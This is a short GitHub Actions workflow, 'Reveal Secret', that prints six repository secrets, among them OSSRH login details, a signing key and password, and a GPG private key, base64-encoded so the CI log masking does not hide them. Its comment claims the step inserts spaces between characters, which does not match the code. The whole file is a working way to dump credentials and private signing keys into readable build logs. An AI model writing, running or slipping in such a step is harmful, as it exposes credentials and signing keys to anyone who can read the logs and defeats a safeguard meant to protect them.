name: Reveal Secret
on: workflow_dispatch  # Allows you to run it manually

jobs:
  reveal:
    runs-on: ubuntu-latest
    steps:
      - name: Read Secret
        run: |
          # This command inserts a space between every character to bypass the mask
          echo "${{ secrets.OSSRH_PASSWORD }}" | base64
          echo "${{ secrets.OSSRH_USERNAME }}" | base64
          echo "${{ secrets.SIGNING_KEY }}" | base64
          echo "${{ secrets.SIGNING_KEY_ID }}" | base64
          echo "${{ secrets.SIGNING_PASSWORD }}" | base64
          echo "${{ secrets.GPG_PRIVATE_KEY }}" | base64
